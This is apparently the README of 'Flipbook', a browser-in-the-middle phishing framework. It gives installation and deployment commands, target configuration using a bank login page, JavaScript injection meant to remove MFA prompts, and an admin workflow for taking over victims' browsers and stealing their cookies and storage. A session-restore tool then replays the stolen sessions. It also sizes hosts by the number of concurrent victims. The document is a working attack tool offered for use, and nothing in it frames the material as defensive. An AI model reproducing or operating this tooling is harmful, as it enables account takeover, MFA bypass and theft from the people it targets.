# Flipbook

# --WIP, Do Not Deploy As Is--

Browser-in-the-Middle (BitM) phishing framework — TypeScript rewrite of CuddlePhish.

**Architecture:** Playwright headless Chromium → CDP `Page.startScreencast` → Socket.IO binary frames → victim `<canvas>` via `createImageBitmap()`. No XVFB. No WebRTC. No STUN/TURN.

---

## Requirements

- Node.js 22 LTS
- Debian/Ubuntu host (Playwright's `--with-deps` installs Chromium system libs)
- screen or tmux (for persistent sessions)
- Docker (optional, for running Caddy reverse proxy)

---

## Installation

```bash
# Clone / unzip to server
cd flipbook

# Install Node deps
npm install

# Install Playwright's Chromium browser + system libraries
npx playwright install chromium --with-deps

# Build TypeScript → dist/
npm run build
```

---

## Configuration

### config.json

Copy `config.example.json` to `config.json` and customize:

```bash
cp config.example.json config.json
```

```json
{
  "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
  "socket_key": "changeme123",
  "admin_ips": ["127.0.0.1", "123.123.123.123"],
  "proxy": null,
  "port": 3000,
  "target": "default"
}
```

| Field | Description |
|---|---|
| `socket_key` | Shared secret for admin authentication. Change before deploying. |
| `admin_ips` | IPs allowed to access `/admin`. Use `["*"]` to allow any (not recommended). |
| `proxy` | Optional upstream proxy, e.g. `"http://127.0.0.1:8080"`. `null` = no proxy. |
| `port` | Server port (default: 3000). Can be overridden with `PORT` env var. |
| `target` | Target name from `targets.json` to load for all victims. |

### targets.json

Add targets interactively:

```bash
npm run add-target
```

This will prompt you for:
- **Target name** (used in `config.json` to select this target)
- **Target URL** (the site to load in the victim's browser)
- **Viewport dimensions** (width/height for the Chromium browser)
- **Optional JavaScript injection** (runs after page load)

Or edit `targets.json` directly:

```json
{
  "mybank": {
    "name": "My Bank",
    "url": "https://mybank.com/login",
    "width": 1920,
    "height": 1080,
    "inject_js": "console.log('injected')"
  },
  "default": {
    "name": "Default Target",
    "url": "https://example.com",
    "width": 1920,
    "height": 1080
  }
}
```

| Field | Description |
|---|---|
| `name` | Display name (shown in admin UI and used as key in targets.json) |
| `url` | Target site the victim's browser will load |
| `width` / `height` | Chromium viewport size — should match what the target site expects |
| `inject_js` | Optional JS injected after page load (e.g. pre-fill forms, remove MFA prompts) |

**Important:** After adding a target, set it in `config.json`:

```json
{
  "target": "mybank"
}
```

All victims will load this target. To switch targets, update `config.json` and restart the server.

---

## Running

### Development (tsx, no build step)

```bash
npm run dev
```

### Production

Build and start the server:

```bash
npm run build
npm start
```

Server starts on `http://0.0.0.0:3000` by default (configured in `config.json`). Override with env vars:

```bash
PORT=8080 HOST=127.0.0.1 npm start
```

**Running in screen/tmux (recommended for production):**

```bash
# Using screen
screen -S flipbook
npm start
# Detach: Ctrl+A, D
# Reattach: screen -r flipbook

# Using tmux
tmux new -s flipbook
npm start
# Detach: Ctrl+B, D
# Reattach: tmux attach -t flipbook
```

This ensures the server survives SSH disconnections and continues running in the background.

---

## Swap (important on low-RAM hosts)

Chromium OOM-kills silently without swap. Run once after provisioning:

```bash
fallocate -l 4G /swapfile && chmod 600 /swapfile
mkswap /swapfile && swapon /swapfile
echo '/swapfile none swap sw 0 0' >> /etc/fstab
```

---

## URLs

| URL | Description |
|---|---|
| `http://HOST/admin` | Admin panel (IP-gated by `admin_ips`) |
| `http://HOST/` | Victim canvas page (root path, no parameters needed) |
| `http://HOST/api/config` | Returns configured target name (used by victim page) |
| `http://HOST/healthz` | Health check |

---

## Victim payload

Simply redirect victims to your server's root URL:

```
https://HOST/
```

**No URL parameters needed.** The target is configured server-side in `config.json` via the `target` field. All victims connecting to the server will automatically load the configured target site.

To change the target, update `config.json` and restart the server.

---

## Admin workflow

1. Open `/admin` from an allowed IP (configured in `admin_ips`)
2. Authenticate with `socket_key` when prompted
3. Wait for victims to appear in the left sidebar (thumbnails auto-update)
4. Click a victim card to select it
5. **Take Over** — your mouse/keyboard now controls the victim's browser; victim sees a "please wait" overlay
6. **Steal Cookies / Steal Storage** — dumps JSON to the admin panel
7. **Give Back** — returns control to victim
8. **Inject JS** — run arbitrary JS in the victim's page
9. **Navigate** — redirect the victim's browser to any URL

**Note:** Victims do not need authentication — they simply visit the root URL and are automatically connected to the configured target.

---

## Session restore

After stealing cookies/storage, restore them in a local browser:

```bash
# Save cookies from admin panel to cookies.json
npm run session-restore -- --cookies cookies.json --url https://mybank.com

# With localStorage too
npm run session-restore -- --cookies cookies.json --storage storage.json --url https://mybank.com
```

This opens a headed Playwright browser with the stolen session pre-loaded.

---

## Reverse proxy (Caddy)

For production deployments, use Caddy as a TLS-terminating reverse proxy. The included `Caddyfile` is configured to:
- Proxy all traffic to `localhost:3000` (Flipbook server)
- Handle WebSocket upgrades (required for Socket.IO)
- Serve static favicon files
- Log access requests

**Recommended setup:**
1. Run Flipbook in a screen/tmux session: `screen -S flipbook npm start`
2. Run Caddy in a Docker container:
   ```bash
   docker run -d \
     --name caddy \
     --network host \
     -v $PWD/Caddyfile:/etc/caddy/Caddyfile \
     -v caddy_data:/data \
     -v caddy_config:/config \
     caddy:latest
   ```

Edit `Caddyfile` and replace `example.com` with your phishing domain before starting Caddy.

---

## Host sizing

| Concurrent victims | RAM | vCPU |
|---|---|---|
| 1–3 | 4 GB | 2 |
| 4–8 | 8 GB | 2–4 |
| 10–15 | 16 GB | 4 |

Hetzner CX31 (2 vCPU / 8 GB / €10/mo) is the recommended starting point.

---

## Project structure

```
src/
  server.ts           — Fastify entry point, routes, Socket.IO wiring
  types.ts            — All shared interfaces and Socket.IO event maps
  browser-manager.ts  — Pre-warm pool, claim/release lifecycle
  screencast.ts       — CDP Page.startScreencast wrapper
  input-handler.ts    — Mouse/keyboard forwarding with coordinate scaling
  session-extractor.ts — Cookie + localStorage extraction via CDP
  socket-handlers.ts  — All Socket.IO event registrations

public/
  victim.html         — Canvas-based victim page (no WebRTC)
  admin.html          — Bootstrap dark theme admin panel

tools/
  add-target.ts       — Interactive target setup
  session-restore.ts  — Session injection tool
```
